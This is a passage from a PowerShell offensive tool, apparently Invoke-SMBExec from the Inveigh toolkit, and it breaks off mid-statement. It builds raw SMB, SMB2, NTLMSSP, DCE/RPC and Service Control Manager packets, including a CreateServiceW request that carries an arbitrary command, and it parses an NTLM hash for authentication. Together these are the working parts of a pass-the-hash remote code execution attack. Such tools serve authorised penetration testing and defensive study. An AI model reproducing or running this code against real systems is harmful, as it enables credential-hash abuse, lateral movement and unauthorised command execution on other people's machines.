    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))

    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))

    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))

    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))

    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))

    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest

}

function New-PacketSMBWriteAndXRequest

{

    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))

    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBWriteAndXRequest.Add("FID",$FileID)

    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))

    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))

    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))

    $SMBWriteAndXRequest.Add("Remaining",$write_length)

    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))

    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)

    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))

    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest

}

function New-PacketSMBCloseRequest

{

    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))

    $SMBCloseRequest.Add("FID",$FileID)

    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))

    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest

}

function New-PacketSMBTreeDisconnectRequest

{

    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))

    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest

}

function New-PacketSMBLogoffAndXRequest

{

    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))

    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))

    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))

    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))

    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest

}

#SMB2

function New-PacketSMB2Header

{

    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)

    {

        $flags = 0x08,0x00,0x00,0x00      

    }

    else

    {

        $flags = 0x00,0x00,0x00,0x00

    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)

    {

        $message_ID += 0x00,0x00,0x00,0x00

    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))

    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))

    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))

    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))

    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2Header.Add("Command",$Command)

    $SMB2Header.Add("CreditRequest",$CreditRequest)

    $SMB2Header.Add("Flags",$flags)

    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2Header.Add("MessageID",$message_ID)

    $SMB2Header.Add("ProcessID",$ProcessID)

    $SMB2Header.Add("TreeID",$TreeID)

    $SMB2Header.Add("SessionID",$SessionID)

    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header

}

function New-PacketSMB2NegotiateProtocolRequest

{

    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))

    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))

    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))

    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))

    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))

    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest

}

function New-PacketSMB2SessionSetupRequest

{

    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))

    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))

    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))

    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))

    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)

    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 

}

function New-PacketSMB2TreeConnectRequest

{

    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))

    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))

    $SMB2TreeConnectRequest.Add("PathLength",$path_length)

    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest

}

function New-PacketSMB2CreateRequestFile

{

    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))

    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))

    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))

    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))

    $SMB2CreateRequestFile.Add("NameLength",$name_length)

    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile

}

function New-PacketSMB2ReadRequest

{

    param ([Byte[]]$FileID)

    $SMB2ReadRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2ReadRequest.Add("StructureSize",[Byte[]](0x31,0x00))

    $SMB2ReadRequest.Add("Padding",[Byte[]](0x50))

    $SMB2ReadRequest.Add("Flags",[Byte[]](0x00))

    $SMB2ReadRequest.Add("Length",[Byte[]](0x00,0x00,0x10,0x00))

    $SMB2ReadRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("FileID",$FileID)

    $SMB2ReadRequest.Add("MinimumCount",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2ReadRequest.Add("ReadChannelInfoOffset",[Byte[]](0x00,0x00))

    $SMB2ReadRequest.Add("ReadChannelInfoLength",[Byte[]](0x00,0x00))

    $SMB2ReadRequest.Add("Buffer",[Byte[]](0x30))

    return $SMB2ReadRequest

}

function New-PacketSMB2WriteRequest

{

    param([Byte[]]$FileID,[Int]$RPCLength)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($RPCLength)

    $SMB2WriteRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2WriteRequest.Add("StructureSize",[Byte[]](0x31,0x00))

    $SMB2WriteRequest.Add("DataOffset",[Byte[]](0x70,0x00))

    $SMB2WriteRequest.Add("Length",$write_length)

    $SMB2WriteRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("FileID",$FileID)

    $SMB2WriteRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("RemainingBytes",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2WriteRequest.Add("WriteChannelInfoOffset",[Byte[]](0x00,0x00))

    $SMB2WriteRequest.Add("WriteChannelInfoLength",[Byte[]](0x00,0x00))

    $SMB2WriteRequest.Add("Flags",[Byte[]](0x00,0x00,0x00,0x00))

    return $SMB2WriteRequest

}

function New-PacketSMB2CloseRequest

{

    param ([Byte[]]$FileID)

    $SMB2CloseRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2CloseRequest.Add("StructureSize",[Byte[]](0x18,0x00))

    $SMB2CloseRequest.Add("Flags",[Byte[]](0x00,0x00))

    $SMB2CloseRequest.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00))

    $SMB2CloseRequest.Add("FileID",$FileID)

    return $SMB2CloseRequest

}

function New-PacketSMB2TreeDisconnectRequest

{

    $SMB2TreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2TreeDisconnectRequest.Add("StructureSize",[Byte[]](0x04,0x00))

    $SMB2TreeDisconnectRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2TreeDisconnectRequest

}

function New-PacketSMB2SessionLogoffRequest

{

    $SMB2SessionLogoffRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $SMB2SessionLogoffRequest.Add("StructureSize",[Byte[]](0x04,0x00))

    $SMB2SessionLogoffRequest.Add("Reserved",[Byte[]](0x00,0x00))

    return $SMB2SessionLogoffRequest

}

#NTLM

function New-PacketNTLMSSPNegotiate

{

    param([Byte[]]$NegotiateFlags,[Byte[]]$Version)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($Version.Length + 32))[0]

    [Byte[]]$ASN_length_1 = $NTLMSSP_length[0] + 32

    [Byte[]]$ASN_length_2 = $NTLMSSP_length[0] + 22

    [Byte[]]$ASN_length_3 = $NTLMSSP_length[0] + 20

    [Byte[]]$ASN_length_4 = $NTLMSSP_length[0] + 2

    $NTLMSSPNegotiate = New-Object System.Collections.Specialized.OrderedDictionary

    $NTLMSSPNegotiate.Add("InitialContextTokenID",[Byte[]](0x60))

    $NTLMSSPNegotiate.Add("InitialcontextTokenLength",$ASN_length_1)

    $NTLMSSPNegotiate.Add("ThisMechID",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("ThisMechLength",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("OID",[Byte[]](0x2b,0x06,0x01,0x05,0x05,0x02))

    $NTLMSSPNegotiate.Add("InnerContextTokenID",[Byte[]](0xa0))

    $NTLMSSPNegotiate.Add("InnerContextTokenLength",$ASN_length_2)

    $NTLMSSPNegotiate.Add("InnerContextTokenID2",[Byte[]](0x30))

    $NTLMSSPNegotiate.Add("InnerContextTokenLength2",$ASN_length_3)

    $NTLMSSPNegotiate.Add("MechTypesID",[Byte[]](0xa0))

    $NTLMSSPNegotiate.Add("MechTypesLength",[Byte[]](0x0e))

    $NTLMSSPNegotiate.Add("MechTypesID2",[Byte[]](0x30))

    $NTLMSSPNegotiate.Add("MechTypesLength2",[Byte[]](0x0c))

    $NTLMSSPNegotiate.Add("MechTypesID3",[Byte[]](0x06))

    $NTLMSSPNegotiate.Add("MechTypesLength3",[Byte[]](0x0a))

    $NTLMSSPNegotiate.Add("MechType",[Byte[]](0x2b,0x06,0x01,0x04,0x01,0x82,0x37,0x02,0x02,0x0a))

    $NTLMSSPNegotiate.Add("MechTokenID",[Byte[]](0xa2))

    $NTLMSSPNegotiate.Add("MechTokenLength",$ASN_length_4)

    $NTLMSSPNegotiate.Add("NTLMSSPID",[Byte[]](0x04))

    $NTLMSSPNegotiate.Add("NTLMSSPLength",$NTLMSSP_length)

    $NTLMSSPNegotiate.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

    $NTLMSSPNegotiate.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))

    $NTLMSSPNegotiate.Add("NegotiateFlags",$NegotiateFlags)

    $NTLMSSPNegotiate.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    $NTLMSSPNegotiate.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    if($Version)

    {

        $NTLMSSPNegotiate.Add("Version",$Version)

    }

    return $NTLMSSPNegotiate

}

function New-PacketNTLMSSPAuth

{

    param([Byte[]]$NTLMResponse)

    [Byte[]]$NTLMSSP_length = ([System.BitConverter]::GetBytes($NTLMResponse.Length))[1,0]

    [Byte[]]$ASN_length_1 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 12))[1,0]

    [Byte[]]$ASN_length_2 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 8))[1,0]

    [Byte[]]$ASN_length_3 = ([System.BitConverter]::GetBytes($NTLMResponse.Length + 4))[1,0]

    $NTLMSSPAuth = New-Object System.Collections.Specialized.OrderedDictionary

    $NTLMSSPAuth.Add("ASNID",[Byte[]](0xa1,0x82))

    $NTLMSSPAuth.Add("ASNLength",$ASN_length_1)

    $NTLMSSPAuth.Add("ASNID2",[Byte[]](0x30,0x82))

    $NTLMSSPAuth.Add("ASNLength2",$ASN_length_2)

    $NTLMSSPAuth.Add("ASNID3",[Byte[]](0xa2,0x82))

    $NTLMSSPAuth.Add("ASNLength3",$ASN_length_3)

    $NTLMSSPAuth.Add("NTLMSSPID",[Byte[]](0x04,0x82))

    $NTLMSSPAuth.Add("NTLMSSPLength",$NTLMSSP_length)

    $NTLMSSPAuth.Add("NTLMResponse",$NTLMResponse)

    return $NTLMSSPAuth

}

#RPC

function New-PacketRPCBind

{

    param([Byte[]]$FragLength,[Int]$CallID,[Byte[]]$NumCtxItems,[Byte[]]$ContextID,[Byte[]]$UUID,[Byte[]]$UUIDVersion)

    [Byte[]]$call_ID = [System.BitConverter]::GetBytes($CallID)

    $RPCBind = New-Object System.Collections.Specialized.OrderedDictionary

    $RPCBind.Add("Version",[Byte[]](0x05))

    $RPCBind.Add("VersionMinor",[Byte[]](0x00))

    $RPCBind.Add("PacketType",[Byte[]](0x0b))

    $RPCBind.Add("PacketFlags",[Byte[]](0x03))

    $RPCBind.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))

    $RPCBind.Add("FragLength",$FragLength)

    $RPCBind.Add("AuthLength",[Byte[]](0x00,0x00))

    $RPCBind.Add("CallID",$call_ID)

    $RPCBind.Add("MaxXmitFrag",[Byte[]](0xb8,0x10))

    $RPCBind.Add("MaxRecvFrag",[Byte[]](0xb8,0x10))

    $RPCBind.Add("AssocGroup",[Byte[]](0x00,0x00,0x00,0x00))

    $RPCBind.Add("NumCtxItems",$NumCtxItems)

    $RPCBind.Add("Unknown",[Byte[]](0x00,0x00,0x00))

    $RPCBind.Add("ContextID",$ContextID)

    $RPCBind.Add("NumTransItems",[Byte[]](0x01))

    $RPCBind.Add("Unknown2",[Byte[]](0x00))

    $RPCBind.Add("Interface",$UUID)

    $RPCBind.Add("InterfaceVer",$UUIDVersion)

    $RPCBind.Add("InterfaceVerMinor",[Byte[]](0x00,0x00))

    $RPCBind.Add("TransferSyntax",[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))

    $RPCBind.Add("TransferSyntaxVer",[Byte[]](0x02,0x00,0x00,0x00))

    if($NumCtxItems[0] -eq 2)

    {

        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))

        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))

        $RPCBind.Add("Unknown3",[Byte[]](0x00))

        $RPCBind.Add("Interface2",$UUID)

        $RPCBind.Add("InterfaceVer2",$UUIDVersion)

        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))

        $RPCBind.Add("TransferSyntax2",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))

    }

    elseif($NumCtxItems[0] -eq 3)

    {

        $RPCBind.Add("ContextID2",[Byte[]](0x01,0x00))

        $RPCBind.Add("NumTransItems2",[Byte[]](0x01))

        $RPCBind.Add("Unknown3",[Byte[]](0x00))

        $RPCBind.Add("Interface2",$UUID)

        $RPCBind.Add("InterfaceVer2",$UUIDVersion)

        $RPCBind.Add("InterfaceVerMinor2",[Byte[]](0x00,0x00))

        $RPCBind.Add("TransferSyntax2",[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))

        $RPCBind.Add("TransferSyntaxVer2",[Byte[]](0x01,0x00,0x00,0x00))

        $RPCBind.Add("ContextID3",[Byte[]](0x02,0x00))

        $RPCBind.Add("NumTransItems3",[Byte[]](0x01))

        $RPCBind.Add("Unknown4",[Byte[]](0x00))

        $RPCBind.Add("Interface3",$UUID)

        $RPCBind.Add("InterfaceVer3",$UUIDVersion)

        $RPCBind.Add("InterfaceVerMinor3",[Byte[]](0x00,0x00))

        $RPCBind.Add("TransferSyntax3",[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $RPCBind.Add("TransferSyntaxVer3",[Byte[]](0x01,0x00,0x00,0x00))

    }

    if($call_ID -eq 3)

    {

        $RPCBind.Add("AuthType",[Byte[]](0x0a))

        $RPCBind.Add("AuthLevel",[Byte[]](0x02))

        $RPCBind.Add("AuthPadLength",[Byte[]](0x00))

        $RPCBind.Add("AuthReserved",[Byte[]](0x00))

        $RPCBind.Add("ContextID3",[Byte[]](0x00,0x00,0x00,0x00))

        $RPCBind.Add("Identifier",[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))

        $RPCBind.Add("MessageType",[Byte[]](0x01,0x00,0x00,0x00))

        $RPCBind.Add("NegotiateFlags",[Byte[]](0x97,0x82,0x08,0xe2))

        $RPCBind.Add("CallingWorkstationDomain",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $RPCBind.Add("CallingWorkstationName",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        $RPCBind.Add("OSVersion",[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))

    }

    return $RPCBind

}

function New-PacketRPCRequest

{

    param([Byte[]]$Flags,[Int]$ServiceLength,[Int]$AuthLength,[Int]$AuthPadding,[Byte[]]$CallID,[Byte[]]$ContextID,[Byte[]]$Opnum,[Byte[]]$Data)

    if($AuthLength -gt 0)

    {

        $full_auth_length = $AuthLength + $AuthPadding + 8

    }

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($ServiceLength + 24 + $full_auth_length + $Data.Length)

    [Byte[]]$frag_length = $write_length[0,1]

    [Byte[]]$alloc_hint = [System.BitConverter]::GetBytes($ServiceLength + $Data.Length)

    [Byte[]]$auth_length = ([System.BitConverter]::GetBytes($AuthLength))[0,1]

    $RPCRequest = New-Object System.Collections.Specialized.OrderedDictionary

    $RPCRequest.Add("Version",[Byte[]](0x05))

    $RPCRequest.Add("VersionMinor",[Byte[]](0x00))

    $RPCRequest.Add("PacketType",[Byte[]](0x00))

    $RPCRequest.Add("PacketFlags",$Flags)

    $RPCRequest.Add("DataRepresentation",[Byte[]](0x10,0x00,0x00,0x00))

    $RPCRequest.Add("FragLength",$frag_length)

    $RPCRequest.Add("AuthLength",$auth_length)

    $RPCRequest.Add("CallID",$CallID)

    $RPCRequest.Add("AllocHint",$alloc_hint)

    $RPCRequest.Add("ContextID",$ContextID)

    $RPCRequest.Add("Opnum",$Opnum)

    if($data.Length)

    {

        $RPCRequest.Add("Data",$Data)

    }

    return $RPCRequest

}

#SCM

function New-PacketSCMOpenSCManagerW

{

    param ([Byte[]]$packet_service,[Byte[]]$packet_service_length)

    $packet_referent_ID1 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $packet_referent_ID1 = $packet_referent_ID1.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $packet_referent_ID1 += 0x00,0x00

    $packet_referent_ID2 = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $packet_referent_ID2 = $packet_referent_ID2.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $packet_referent_ID2 += 0x00,0x00

    $packet_SCMOpenSCManagerW = New-Object System.Collections.Specialized.OrderedDictionary

    $packet_SCMOpenSCManagerW.Add("MachineName_ReferentID",$packet_referent_ID1)

    $packet_SCMOpenSCManagerW.Add("MachineName_MaxCount",$packet_service_length)

    $packet_SCMOpenSCManagerW.Add("MachineName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("MachineName_ActualCount",$packet_service_length)

    $packet_SCMOpenSCManagerW.Add("MachineName",$packet_service)

    $packet_SCMOpenSCManagerW.Add("Database_ReferentID",$packet_referent_ID2)

    $packet_SCMOpenSCManagerW.Add("Database_NameMaxCount",[Byte[]](0x0f,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("Database_NameOffset",[Byte[]](0x00,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("Database_NameActualCount",[Byte[]](0x0f,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))

    $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))

    $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))

    return $packet_SCMOpenSCManagerW

}

function New-PacketSCMCreateServiceW

{

    param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)

    $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

    $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

    $referent_ID += 0x00,0x00

    $SCMCreateServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $SCMCreateServiceW.Add("ContextHandle",$ContextHandle)

    $SCMCreateServiceW.Add("ServiceName_MaxCount",$ServiceLength)

    $SCMCreateServiceW.Add("ServiceName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("ServiceName_ActualCount",$ServiceLength)

    $SCMCreateServiceW.Add("ServiceName",$Service)

    $SCMCreateServiceW.Add("DisplayName_ReferentID",$referent_ID)

    $SCMCreateServiceW.Add("DisplayName_MaxCount",$ServiceLength)

    $SCMCreateServiceW.Add("DisplayName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("DisplayName_ActualCount",$ServiceLength)

    $SCMCreateServiceW.Add("DisplayName",$Service)

    $SCMCreateServiceW.Add("AccessMask",[Byte[]](0xff,0x01,0x0f,0x00))

    $SCMCreateServiceW.Add("ServiceType",[Byte[]](0x10,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("ServiceStartType",[Byte[]](0x03,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("ServiceErrorControl",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("BinaryPathName_MaxCount",$CommandLength)

    $SCMCreateServiceW.Add("BinaryPathName_Offset",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("BinaryPathName_ActualCount",$CommandLength)

    $SCMCreateServiceW.Add("BinaryPathName",$Command)

    $SCMCreateServiceW.Add("NULLPointer",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("TagID",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("NULLPointer2",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("DependSize",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("NULLPointer3",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("NULLPointer4",[Byte[]](0x00,0x00,0x00,0x00))

    $SCMCreateServiceW.Add("PasswordSize",[Byte[]](0x00,0x00,0x00,0x00))

    return $SCMCreateServiceW

}

function New-PacketSCMStartServiceW

{

    param([Byte[]]$ContextHandle)

    $SCMStartServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $SCMStartServiceW.Add("ContextHandle",$ContextHandle)

    $SCMStartServiceW.Add("Unknown",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SCMStartServiceW

}

function New-PacketSCMDeleteServiceW

{

    param([Byte[]]$ContextHandle)

    $SCMDeleteServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $SCMDeleteServiceW.Add("ContextHandle",$ContextHandle)

    return $SCMDeleteServiceW

}

function New-PacketSCMCloseServiceHandle

{

    param([Byte[]]$ContextHandle)

    $SCM_CloseServiceW = New-Object System.Collections.Specialized.OrderedDictionary

    $SCM_CloseServiceW.Add("ContextHandle",$ContextHandle)

    return $SCM_CloseServiceW

}

function Get-StatusPending

{

    param ([Byte[]]$Status)

    if([System.BitConverter]::ToString($Status) -eq '03-01-00-00')

    {

        $status_pending = $true

    }

    return $status_pending

}

function Get-UInt16DataLength

{

    param ([Int]$Start,[Byte[]]$Data)

    $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

    return $data_length

}

if($hash -like "*:*")

{

    $hash = $hash.SubString(($hash.IndexOf(":") + 1),32)

}

if($Domain)

{

    $output_username = $Domain + "\" + $Username

}

else

{

    $output_username = $Username

}

if($PSBoundParameters.ContainsKey('Session'))

{

    $inveigh_session = $true

}

if($PSBoundParameters.ContainsKey('Session'))

{

